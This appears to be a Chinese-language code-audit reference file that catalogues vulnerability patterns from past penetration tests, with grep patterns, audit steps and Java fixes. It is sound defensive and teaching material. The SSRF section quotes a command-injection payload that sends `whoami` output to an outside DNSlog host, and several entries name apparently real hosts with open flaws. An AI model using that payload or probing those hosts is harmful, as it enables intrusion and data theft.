---
name: real-world-patterns
description: 真实漏洞模式库 — 基于18份历史渗透测试报告归纳的高频漏洞模式
config:
  progression:
    phase: "2"
    name: "Real-World Vulnerability Patterns"
    prev: "Phase 1 Reconnaissance"
    next: "Phase 3 Static Verification"
    trigger: "loaded during audit"
    when: "always loaded as reference"
---

# 真实漏洞模式库

**来源：** 18 份历史渗透测试报告（Pacstrust、Cregis、Udun/优盾、AurumVault、CSPN）
**覆盖项目：** 5 个，涉及后台管理系统、中台系统、钱包系统、支付系统
**漏洞总数：** 100+ 个真实发现

> **使用说明：** 本文件汇总了历史审计中真实发现的漏洞模式。执行审计时应优先检测这些高频模式。每个模式包含：典型代码特征、Grep 检测模式、真实案例。

---

## 一、认证与 Token 管理缺陷

### 1.1 JWT 无过期时间（中危 → 高频出现）

**真实案例：** Pacstrust 后台 (`admin.pacstrust.top`)、Pacstrust 中台 (`dashboard.pacstrust.top`) 均发现。Token 生成时未设置 `exp` 字段，导致永久有效。

**特征：**
- JWT 生成代码中缺少 `.setExpiration()` 或 `.exp()`
- 返回的 JWT payload 中无 `exp` 字段
- 服务端验证时不检查过期时间

**检测模式（Grep）：**
```
Jwts\.builder\(\)(?!.*setExpiration)
JwtBuilder.*sign\(.*compact\(\)(?!.*exp)
\.setExpiration\s*\(.*System\.currentTimeMillis\(\)\s*\+\s*0
```

**检测步骤：**
1. 搜索 JWT 生成逻辑（`Jwts.builder()`、`JwtBuilder`、`createToken`）
2. 检查是否调用 `setExpiration()` 或 `.exp()`
3. 检查过期时间是否为合理值（建议 ≤ 2 小时）
4. 检查服务端验证逻辑是否检查过期状态

**修复方案：**
```java
// Before: 无过期时间
Jwts.builder()
    .setSubject(username)
    .signWith(key, SignatureAlgorithm.HS256)
    .compact();

// After: 设置过期时间
Jwts.builder()
    .setSubject(username)
    .setExpiration(new Date(System.currentTimeMillis() + 3600000)) // 1小时
    .setIssuedAt(new Date())
    .signWith(key, SignatureAlgorithm.HS256)
    .compact();
```

---

### 1.2 注销后 Token 不失效（中危）

**真实案例：** Pacstrust 后台、中台。用户点击"退出系统"后，原 Authorization 仍可继续使用；再次登录 Token 不重置。

**特征：**
- logout 接口仅返回 200，不清理 Session/Token
- 无 Token 黑名单机制
- 无 Token 版本号机制

**检测模式（Grep）：**
```
logout.*\{|logout\(\)\s*\{
@PostMapping.*logout|@RequestMapping.*logout
redisTemplate\.delete.*token(?!.*黑名单|blacklist)
```

**检测步骤：**
1. 搜索 logout 接口
2. 检查是否清理 Redis Session/Token
3. 检查是否有 Token 黑名单或版本控制
4. 检查再次登录时是否生成新 Token

**修复方案：**
```java
// 方案1: Token 黑名单
@PostMapping("/logout")
public Result logout(@RequestHeader("Authorization") String token) {
    String blacklistKey = "token:blacklist:" + extractJti(token);
    long ttl = getRemainingTtl(token);
    redisTemplate.opsForValue().set(blacklistKey, "1", ttl, TimeUnit.SECONDS);
    return Result.success();
}

// 方案2: Token 版本控制
public void logout(Long userId) {
    redisTemplate.opsForValue().set("token:version:" + userId, 
        System.currentTimeMillis(), 30, TimeUnit.DAYS);
}
// 验证时: 检查 token 中的 version 是否等于 Redis 中的 version
```

---

### 1.3 验证码消费后不失效（中危）

**真实案例：** AurumVault 中台密码重置。验证码使用一次后仍可重复使用。

**特征：**
- 验证码校验通过后不删除
- 验证码无使用次数限制

**检测模式（Grep）：**
```
checkCode.*\{|verifyCode.*\{|validateCaptcha
session\.getAttribute.*code|redisTemplate.*get.*code
```

**检测步骤：**
1. 搜索验证码校验逻辑
2. 检查校验成功后是否删除验证码
3. 检查验证码有效期是否合理（建议 ≤ 5 分钟）

**修复方案：**
```java
public boolean verifyCode(String phone, String code) {
    String key = "sms:code:" + phone;
    String savedCode = redisTemplate.opsForValue().get(key);
    if (!code.equals(savedCode)) {
        return false;
    }
    // 关键：校验后立即删除，确保一次性
    redisTemplate.delete(key);
    return true;
}
```

---

### 1.4 密码验证绕过 — 篡改返回包（高危）

**真实案例：** CSPN 平台验证密码接口。前端依赖返回包 `isPassed` 字段判断，攻击者抓包改为 `1` 即可绕过。

**特征：**
- 前端根据 `response.data.isPassed` / `response.data.success` 判断验证结果
- 服务端返回包包含可被篡改的状态字段
- 关键操作不依赖服务端独立判断

**检测模式（Grep）：**
```
isPassed|verifySuccess|passwordCheck|onlineCheck
response\.data\.isPassed|res\.data\.success
```

**检测步骤：**
1. 搜索密码验证相关接口
2. 检查前端是否依赖返回包状态字段做权限判断
3. 检查关键操作（取消汇款、转账等）是否在服务端重新验证密码
4. 检查是否存在"前端说通过就通过"的逻辑

**修复方案：**
```java
// 密码验证结果必须由服务端控制
@PostMapping("/onlineCheck")
public Result checkPassword(@RequestBody PasswordCheckReq req) {
    boolean passed = passwordService.verify(req.getUserId(), req.getPassword());
    // 服务端直接执行操作，不返回"通过/不通过"让前端判断
    if (passed) {
        remitService.cancelOrder(req.getOrderId());
        return Result.success();
    }
    return Result.error("密码错误");
}
```

---

## 二、越权漏洞模式

### 2.1 垂直越权 — 仅校验 Token 不校验角色等级（高危）

**真实案例：**
- Pacstrust 后台：无任何权限的用户可访问资产管理、汇款记录、用户管理等接口（20+ 个接口）
- Pacstrust 中台：低权限用户可访问超级管理员接口
- AurumVault 中台：仅有"资产查看"权限的账号可访问理财账户、商户管理等接口

**特征：**
- 接口有 `@PreAuthorize` 但仅校验登录态（`isAuthenticated()`），不校验角色
- 接口无任何权限注解
- 权限校验在前端（隐藏菜单），后端不校验

**检测模式（Grep）：**
```
@PreAuthorize\("isAuthenticated\(\)"\)
@PreAuthorize\("hasRole\('USER'\)"\)
@PreAuthorize\("hasRole\('user'\)"\)
(?!.*@PreAuthorize|@Secured|@RolesAllowed).*(@GetMapping|@PostMapping|@PutMapping|@DeleteMapping|@RequestMapping)
```

**检测步骤：**
1. 列出所有 Controller 接口
2. 筛选无 `@PreAuthorize`/`@Secured`/自定义鉴权注解的接口
3. 对有 `@PreAuthorize("isAuthenticated()")` 的接口，检查是否应限制角色
4. 对每个敏感接口（资产管理、汇款记录、用户管理等），用低权限 Token 测试

**修复方案：**
```java
// Before: 仅校验登录态
@PreAuthorize("isAuthenticated()")
@GetMapping("/api/admin/byberMerchants/getMerchantAccount")

// After: 校验角色
@PreAuthorize("hasRole('ADMIN') or hasRole('SUPER_ADMIN')")
@GetMapping("/api/admin/byberMerchants/getMerchantAccount")
```

---

### 2.2 水平越权 — 数据归属未校验（高危）

**真实案例：**
- Pacstrust 中台：修改 `userId` 参数可重置任意用户权限
- Udun：修改 `walletId` 可查看任意钱包币种
- CSPN：修改 `fileIds` 可获取任意用户上传的文件
- Cregis：修改子域名可越权查看他人钱包信息

**特征：**
- 接口参数包含 `userId`、`walletId`、`payeeId`、`fileId`、`roleId`、`orderId` 等
- 查询时未加 `WHERE user_id = current_user_id`
- 操作时未校验"操作的数据是否属于当前用户"

**检测模式（Grep）：**
```
getById\(|selectById\(|findById\(|getByIdAndUserId
WHERE\s+id\s*=\s*#{id}(?!.*user_id|merchant_id|team_id)
@RequestParam.*Id|@PathVariable.*Id
walletId|userId|merchantId|teamId|payeeId|roleId|fileId|orderId
```

**检测步骤：**
1. 搜索所有包含 `*Id` 参数的接口
2. 对每个接口，检查 SQL 或 ORM 查询是否包含 `user_id` / `merchant_id` / `team_id` 过滤
3. 检查修改/删除操作是否校验数据归属
4. 检查 ID 是否可预测（自增 vs UUID）

**修复方案：**
```java
// Before: 仅按 ID 查询
@Select("SELECT * FROM payee WHERE payee_id = #{payeeId}")
Payee getPayee(@Param("payeeId") Long payeeId);

// After: 增加用户归属校验
@Select("SELECT * FROM payee WHERE payee_id = #{payeeId} AND merchant_id = #{merchantId}")
Payee getPayee(@Param("payeeId") Long payeeId, @Param("merchantId") Long merchantId);
```

---

### 2.3 子域名越权 — 未做域名绑定校验（高危）

**真实案例：** Cregis 平台。用户子域名 `t-xxx.cregis.dev` 中的 `xxx` 为用户标识，替换子域名即可越权访问他人数据。

**特征：**
- 平台为每个用户分配独立子域名
- 接口未校验请求来源子域名与当前登录用户的绑定关系

**检测模式（Grep）：**
```
subdomain|tenant.*domain|\.cregis\.|t-[a-z]+\.
@RequestHeader.*Host|getServerName|getHost
```

**检测步骤：**
1. 检查是否使用子域名隔离用户数据
2. 检查接口是否校验请求 Host 与当前用户的绑定关系
3. 检查是否可通过替换子域名访问他人数据

**修复方案：**
```java
// 在拦截器中强制校验
public boolean preHandle(HttpServletRequest request, ...) {
    String host = request.getServerName(); // t-xxx.cregis.dev
    String userSubdomain = userService.getUserSubdomain(currentUserId);
    if (!host.startsWith("t-" + userSubdomain)) {
        throw new UnauthorizedException("子域名不匹配");
    }
    return true;
}
```

---

### 2.4 审批越权 — 审批操作不校验审批人权限（高危）

**真实案例：** Udun 平台审批驳回接口。任意用户遍历审批记录 ID 即可驳回他人审批。

**特征：**
- 审批接口参数仅包含 `recordId` / `approvalId`
- 不校验"当前用户是否有审批权限"
- 不校验"当前用户是否为该审批的审批人"

**检测模式（Grep）：**
```
reject.*\(|approve.*\(|audit.*record|approval.*status
/sign/rejectSingle|/sign/approve|审批.*驳回|审批.*通过
```

**检测步骤：**
1. 搜索审批/驳回相关接口
2. 检查是否校验当前用户的审批权限
3. 检查是否校验"当前用户是否为该记录的审批人"
4. 检查是否可遍历记录 ID

**修复方案：**
```java
@PostMapping("/sign/rejectSingle")
public Result rejectSingle(@RequestBody RejectReq req) {
    ApprovalRecord record = approvalMapper.selectById(req.getRecordId());
    // 关键：校验当前用户是否有审批权限
    if (!approvalService.isApprover(currentUserId, record.getRecordId())) {
        throw new UnauthorizedException("无权审批该记录");
    }
    approvalMapper.updateStatus(record.getRecordId(), Status.REJECTED, currentUserId);
    return Result.success();
}
```

---

## 三、未授权访问模式

### 3.1 SpringBoot Actuator 未授权（中危 → 高频）

**真实案例：** Pacstrust 后台/中台、Cregis（`/actuator/heapdump` 泄露数据库密码）

**特征：**
- `management.endpoints.web.exposure.include=*`
- Actuator 端点未配置 Spring Security 拦截

**检测模式（Grep）：**
```
management\.endpoints\.web\.exposure\.include.*\*
@EnableWebSecurity(?!.*actuator|endpoint)
/actuator/env|/actuator/heapdump|/actuator/beans
```

**检测步骤：**
1. 检查 `application.yml/properties` 中 Actuator 暴露配置
2. 检查 Spring Security 配置是否拦截 `/actuator/**`
3. 尝试访问 `/actuator/env`、`/actuator/heapdump`

**修复方案：**
```yaml
# application.yml
management:
  endpoints:
    web:
      exposure:
        include: health,info  # 仅暴露必要端点
  endpoint:
    health:
      show-details: when-authorized
```

```java
// Spring Security 配置
http.authorizeHttpRequests(auth -> auth
    .requestMatchers("/actuator/**").hasRole("ADMIN")
    // ...
);
```

---

### 3.2 Swagger/API 文档未授权（高危）

**真实案例：** Udun（3 处）、Cregis（2 处）

**特征：**
- `/v2/api-docs`、`/v3/api-docs`、`/swagger-ui.html` 未配置鉴权
- 生产环境未禁用 Swagger

**检测模式（Grep）：**
```
springfox|springdoc|swagger-ui|api-docs
@EnableSwagger2|@OpenAPIDefinition
/v2/api-docs|/v3/api-docs|/swagger-ui
```

**检测步骤：**
1. 检查项目依赖是否包含 springfox / springdoc
2. 检查生产环境是否禁用 Swagger
3. 尝试访问 `/v2/api-docs`、`/v3/api-docs`

**修复方案：**
```java
@Configuration
public class SwaggerConfig {
    @Bean
    public Docket api(@Value("${spring.profiles.active:dev}") String profile) {
        if (!"dev".equals(profile) && !"test".equals(profile)) {
            return new Docket(DocumentationType.SWAGGER_2).enable(false);
        }
        return new Docket(DocumentationType.SWAGGER_2);
    }
}
```

---

### 3.3 Nacos/Druid/Loki 等中间件暴露（高危）

**真实案例：** Cregis — Nacos(8848)、MySQL(3307)、Loki(30100)、Druid 全部暴露公网

**检测模式（Grep）：**
```
nacos.*server-addr|druid.*stat|loki.*endpoint
8848|3307|30100|9090|9200|5601
```

**检测步骤：**
1. 检查配置文件中的中间件地址是否绑定公网 IP
2. 检查防火墙/安全组规则
3. 检查中间件是否配置认证

---

### 3.4 权限树/角色接口未授权（中危）

**真实案例：** AurumVault 后台 `/api/admin/portal/role/new/findTree` 未授权可获取完整权限树

**特征：**
- `/portal/role/findTree`、`/portal/role/new/findTree`、`/portal/role/query/all` 等接口无鉴权
- 返回完整权限菜单树结构

**检测模式（Grep）：**
```
/portal/role|/role/findTree|/role/query|/role/new
PermissionTree|RoleTree|MenuTree|权限树
```

**检测步骤：**
1. 搜索角色/权限相关接口
2. 检查是否有 `@PreAuthorize` / 自定义鉴权注解
3. 匿名访问测试

---

### 3.5 导出接口数据隔离缺失（高危）

**真实案例：** CSPN 汇款记录导出 — 不添加筛选条件可导出全平台所有用户记录

**特征：**
- 导出接口参数无 `userId` 强制过滤
- 不传筛选条件时默认查询全量数据
- 导出逻辑未做数据范围限制

**检测模式（Grep）：**
```
export.*\(\)|导出|Excel|csv|download
getSysRemitExcel|getMerchantBillExcel|getOrderExcel
```

**检测步骤：**
1. 搜索导出/下载相关接口
2. 检查 SQL 查询是否强制包含当前用户 ID 过滤
3. 不传筛选条件测试是否返回全量数据

**修复方案：**
```java
@GetMapping("/export")
public void export(HttpServletResponse response, @AuthenticationPrincipal User user) {
    // 强制使用当前用户 ID 过滤
    List<Record> records = recordMapper.selectByUserId(user.getId());
    // ... 导出逻辑
}
```

---

## 四、SSRF 模式

### 4.1 URL 参数直接传入（高危）

**真实案例：**
- Udun 币种 logo 参数：修改 URL 为 dnslog 地址可触发 SSRF
- Udun API 调试工具回调地址：自定义回调地址可触发任意 HTTP 请求
- Cregis 回调模块：输入 `http://127.0.0.1:8080` 可访问内网服务

**特征：**
- 接口参数包含 URL/域名/IP
- 服务端对参数发起 HTTP 请求
- 无白名单/协议限制

**检测模式（Grep）：**
```
RestTemplate.*getForObject|RestTemplate.*exchange
HttpClient.*execute|OkHttpClient.*newCall
WebClient.*get|HttpURLConnection
RestTemplate|OkHttpClient|HttpClient|WebClient
callback.*url|callback.*address|回调.*地址|logo.*url
```

**检测步骤：**
1. 搜索发起 HTTP 请求的代码
2. 检查请求目标是否来自用户输入
3. 检查是否有 URL 白名单校验
4. 检查是否限制协议（禁止 `file://`、`gopher://`）
5. 检查是否拦截内网 IP（`127.0.0.0/8`、`10.0.0.0/8`、`169.254.169.254`）

**修复方案：**
```java
public String fetchUrl(String userUrl) {
    // 1. 协议白名单
    URI uri = URI.create(userUrl);
    if (!List.of("http", "https").contains(uri.getScheme())) {
        throw new IllegalArgumentException("仅支持 HTTP/HTTPS");
    }
    // 2. 内网 IP 拦截
    String host = uri.getHost();
    if (isInternalIp(host)) {
        throw new IllegalArgumentException("禁止访问内网地址");
    }
    // 3. 域名白名单
    if (!whitelist.contains(host)) {
        throw new IllegalArgumentException("域名不在白名单中");
    }
    return restTemplate.getForObject(userUrl, String.class);
}
```

### 4.2 DNSlog 探测模式（高危）

**真实案例：** Cregis 回调模块 `http://$(whoami|base64).dqtx48.ceye.io` 可查看系统路径

**特征：**
- URL 参数可包含特殊字符（`$()`、`` ` ``）
- 服务端未做输入清洗直接发起请求

**检测模式（Grep）：**
```
Runtime\.getRuntime|ProcessBuilder|\$\(|`.*`
```

---

## 五、业务逻辑漏洞模式

### 5.1 负数金额绕过（高危 → 极高频）

**真实案例：**
- Pacstrust：sort 参数可改为负值
- Udun：硬件钱包数量可设为负数，少付款
- Udun：`riseMultiple=-999999999999` 极端负数
- Cregis：钱包数量可设为小数（1.1）
- AurumVault：金额参数可设为负数

**特征：**
- 前端有 `min="0"` 限制
- 后端未校验 `amount > 0`
- 数值型参数未做范围限制

**检测模式（Grep）：**
```
amount|price|fee|sort|count|quantity|number|multiple
addValue|riseMultiple|minValue|maxValue
```

**检测步骤：**
1. 搜索所有数值型参数
2. 检查后端是否有 `> 0` 校验
3. 检查是否有上限校验
4. 检查是否为整数类型（防小数）

**修复方案：**
```java
// Before: 无校验
public void setSort(@RequestParam Integer sort) {
    config.setSort(sort);
}

// After: 后端强校验
public void setSort(@RequestParam Integer sort) {
    if (sort == null || sort < 0) {
        throw new BusinessException("排序值必须为非负整数");
    }
    config.setSort(sort);
}
```

---

### 5.2 精度绕过 — 存储精度 vs 显示精度不一致（中危）

**真实案例：** AurumVault 后台理财产品。将 `9.99` 改为 `9.991`，服务端比较 `9.991 > 9.99` 通过，但存储/展示仅保留两位小数，导致可创建多个展示金额相同的理财产品。

**特征：**
- 参数使用 BigDecimal/float
- 比较用全精度，存储/展示截断精度
- 唯一性校验使用截断后精度

**检测模式（Grep）：**
```
setScale|ROUND|precision|精度|setScale\(2
compareTo|\.compareTo
```

**检测步骤：**
1. 搜索涉及金额/数值的接口
2. 检查比较逻辑与存储逻辑是否使用相同精度
3. 检查唯一性校验使用哪种精度

**修复方案：**
```java
// 接收参数后立即统一精度
BigDecimal amount = req.getAmount().setScale(2, RoundingMode.HALF_UP);
// 所有后续操作均使用此精度
```

---

### 5.3 参数篡改绕过前端限制（中危 → 高频）

**真实案例：**
- Pacstrust：sort 参数前端限制非负，抓包改为负值
- Udun：支付金额前端限制正数，抓包改为负数
- Cregis：购买数量可改为远超支付价值的数值（200$ 买到 500 万额度）

**特征：**
- 前端有校验（min/max/disabled）
- 后端未重新校验
- 前端计算金额/数量，后端直接使用

**检测步骤：**
1. 识别所有前端有限制的参数
2. 检查后端是否有对应校验
3. 检查金额/数量是否在后端重新计算

---

### 5.4 竞争条件 — 并发创建同名资源（低危）

**真实案例：** Cregis 创建 WaaS 项目。快速重复发包可创建多个名称完全相同的项目。

**特征：**
- `SELECT COUNT WHERE name = X` 后 `INSERT`，非原子操作
- 无数据库唯一约束

**检测模式（Grep）：**
```
SELECT.*COUNT.*WHERE.*name|checkName|checkUnique
@Transactional(?!.*isolation|readOnly)
```

**检测步骤：**
1. 搜索名称唯一性校验逻辑
2. 检查是否为原子操作（唯一索引 / 事务隔离）
3. 检查数据库是否有 `UNIQUE` 约束

**修复方案：**
```java
// 方案1: 数据库唯一索引
ALTER TABLE project ADD UNIQUE KEY uk_name (name, merchant_id);

// 方案2: 分布式锁
public void createProject(String name) {
    String lockKey = "project:name:" + name;
    try {
        if (!redisLock.tryLock(lockKey, 5)) {
            throw new BusinessException("项目创建中，请稍候");
        }
        if (projectMapper.countByName(name) > 0) {
            throw new BusinessException("项目名称已存在");
        }
        projectMapper.insert(new Project(name));
    } finally {
        redisLock.unlock(lockKey);
    }
}
```

---

### 5.5 前端计算金额（高危）

**特征：**
- 前端 `price * quantity = total` 直接传递给后端
- 后端未重新查询价格并计算

**检测模式（Grep）：**
```
totalAmount|totalPrice|total.*amount|应付金额|实付金额
```

**检测步骤：**
1. 搜索金额相关接口
2. 检查后端是否重新查询价格并计算
3. 检查前端是否传递计算后的金额

**修复方案：**
```java
// 后端重新计算，不信任前端传递的金额
public Order createOrder(Long productId, Integer quantity) {
    Product product = productMapper.selectById(productId);
    BigDecimal total = product.getPrice().multiply(BigDecimal.valueOf(quantity));
    // 使用后端计算的金额
    order.setTotalAmount(total);
    return orderMapper.insert(order);
}
```

---

## 六、敏感信息泄露模式

### 6.1 前端 JS 文件泄露密码/API Key（中危）

**真实案例：** Pacstrust 后台 `index-BjVC3AIg.js` 中存在用户名密码

**检测模式（Grep）：**
```
password.*:.*['"][^"']{4,}['"]
secret.*:.*['"][^"']{8,}['"]
api_key.*:.*['"][^"']{8,}['"]
```

**检测步骤：**
1. 扫描所有 JS/TS 文件
2. 搜索密码、密钥、API Key 等关键字
3. 检查是否为硬编码

### 6.2 heapdump 泄露数据库密码（高危）

**真实案例：** Cregis `website.cregis.dev/actuator/heapdump` 可下载分析获取数据库密码

**检测模式：**
- 检查 Actuator heapdump 端点是否可匿名访问

### 6.3 日志系统泄露敏感信息（高危）

**真实案例：** Cregis Loki 日志系统未授权，可读取 OSS 配置和所有日志内容

**检测步骤：**
1. 检查日志系统（Loki/ELK/Splunk）是否暴露公网
2. 检查是否配置认证

### 6.4 API Key 泄露（高危）

**真实案例：** Udun 区块链配置接口泄露 INFURA/ALCHEMY 等平台的真实 API Key

**检测模式（Grep）：**
```
apiKey|api_key|secret_key|accessKeyId|secretAccessKey
Bearer|Authorization.*key
```

---

## 七、轰炸类漏洞模式

### 7.1 邮箱轰炸 — 空格绕过（高危）

**真实案例：**
- Udun：邮箱后加空格可绕过限制，无限发送
- AurumVault：邮箱前置空格可绕过校验，批量发送注册邮件

**特征：**
- 前端/后端未 `trim()` 邮箱
- 无发送频率限制
- 无邮箱归属权校验

**检测模式（Grep）：**
```
sendEmail|sendSms|sendCode|验证码|发送邮件
trim\s*\(|\.trim\(\)|StringUtils\.trim
```

**检测步骤：**
1. 搜索邮件/短信发送逻辑
2. 检查是否 `trim()` 处理邮箱
3. 检查是否有频率限制（同 IP / 同邮箱 / 同时间段）
4. 检查是否校验邮箱归属权

**修复方案：**
```java
public void sendEmail(String email) {
    // 1. 统一清理
    email = email.trim().toLowerCase();
    // 2. 格式校验
    if (!isValidEmail(email)) throw new BusinessException("邮箱格式错误");
    // 3. 频率限制
    String rateKey = "email:rate:" + email;
    Long count = redisTemplate.opsForValue().increment(rateKey);
    if (count == 1) redisTemplate.expire(rateKey, 1, TimeUnit.HOURS);
    if (count > 5) throw new BusinessException("发送过于频繁");
    // 4. 归属权校验
    emailService.send(email);
}
```

### 7.2 短信验证码不失效（中危）

**真实案例：** AurumVault 中台验证码使用后不失效，可重复使用

**修复方案：** 见 1.3 节

---

## 八、文件操作类漏洞

### 8.1 上传文件取消后未删除（低危）

**真实案例：** Pacstrust 后台/中台 — 取消上传后文件仍存储在 OSS 存储桶中

**特征：**
- 文件先上传到临时目录
- 取消操作仅更新状态，不删除文件

**检测步骤：**
1. 搜索文件上传逻辑
2. 检查"取消"操作是否删除已上传文件
3. 检查临时文件是否有清理机制

### 8.2 未授权文件下载（中危）

**真实案例：** Pacstrust 后台/中台 — 直接访问 OSS URL 可下载任意上传的文件

**特征：**
- 文件 URL 可预测（UUID + 日期目录）
- 下载时不校验用户权限

**检测步骤：**
1. 搜索文件下载/访问逻辑
2. 检查是否校验"当前用户是否有权访问该文件"
3. 检查 URL 是否可预测

### 8.3 任意文件上传（高危）

**真实案例：** CSPN 后台 OSS 存储桶可上传任意类型文件（.jsp 等）

**特征：**
- 文件上传未限制后缀
- 存储桶配置允许直接上传

**检测模式（Grep）：**
```
upload|UploadController|multipart|OSS|S3|MinIO
getOriginalFilename|suffix|extension|contentType
```

**检测步骤：**
1. 搜索文件上传接口
2. 检查后缀白名单
3. 检查 Content-Type 校验
4. 检查存储桶权限配置

**修复方案：**
```java
public String upload(MultipartFile file) {
    String originalFilename = file.getOriginalFilename();
    String suffix = originalFilename.substring(originalFilename.lastIndexOf("."));
    // 白名单校验
    List<String> allowed = List.of(".jpg", ".png", ".pdf");
    if (!allowed.contains(suffix.toLowerCase())) {
        throw new BusinessException("不支持的文件类型");
    }
    // 重命名，防止路径遍历
    String newFilename = UUID.randomUUID() + suffix;
    return ossClient.putObject(bucket, newFilename, file.getInputStream());
}
```

---

## 九、综合检测清单

执行审计时，按以下清单优先检测高频漏洞：

### Phase 2B 控制流检测优先项
- [ ] JWT 是否设置过期时间
- [ ] 注销逻辑是否失效 Token
- [ ] 验证码是否一次性消费
- [ ] Actuator 端点是否未授权
- [ ] Swagger 是否未授权
- [ ] Nacos/Druid/Loki 是否暴露
- [ ] 权限树/角色接口是否未授权
- [ ] CORS 是否配置不当

### Phase 2C 逻辑流检测优先项
- [ ] 所有数值型参数是否校验范围（>0、上限、整数）
- [ ] 金额是否在后端重新计算
- [ ] 导出接口是否按用户过滤
- [ ] 审批接口是否校验审批人
- [ ] 唯一性校验是否原子
- [ ] 邮箱/短信是否限流+trim+去重
- [ ] 文件上传是否限制后缀
- [ ] 文件下载是否校验权限

### Phase 2A Sink 检测优先项
- [ ] 所有 URL 参数是否白名单校验
- [ ] 所有 HTTP 请求目标是否内网拦截
- [ ] JSON 数组参数是否防 SQL 注入
- [ ] MyBatis XML 是否使用 `#{}` 而非 `${}`
